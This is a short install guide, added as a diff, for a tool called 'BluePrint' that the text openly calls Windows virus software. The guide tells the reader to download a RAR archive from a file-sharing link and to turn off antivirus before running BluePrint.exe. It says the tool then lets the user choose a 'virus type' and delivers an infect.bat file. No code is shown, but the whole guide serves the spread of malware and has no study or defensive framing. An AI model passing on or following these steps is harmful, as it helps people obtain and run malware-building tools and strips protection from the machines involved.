@@ -1,0 +1,11 @@
+Hi Dear Welcome To BluePrint Install Guid :)
+
+1 - Download RAR  File From : https://filebin.net/v46nn0hrn6e3gpuc/BluePrint.rar
+2 - Be sure to turn off your antivirus before running
++ Why ? Because the software is a virus software for Windows and the Windows virus codes inside it cause problems
+3 - Run BluePrint.exe And Waite For load Scripts ...
+4 - Now select your virus type and wait for it to be delivered to you in file format > infect.bat
+5 - Enjoy :D
+
+Creator : https://github.com/mrd3f417
+Bp Site : https://mrd3f417.github.io/blueprint
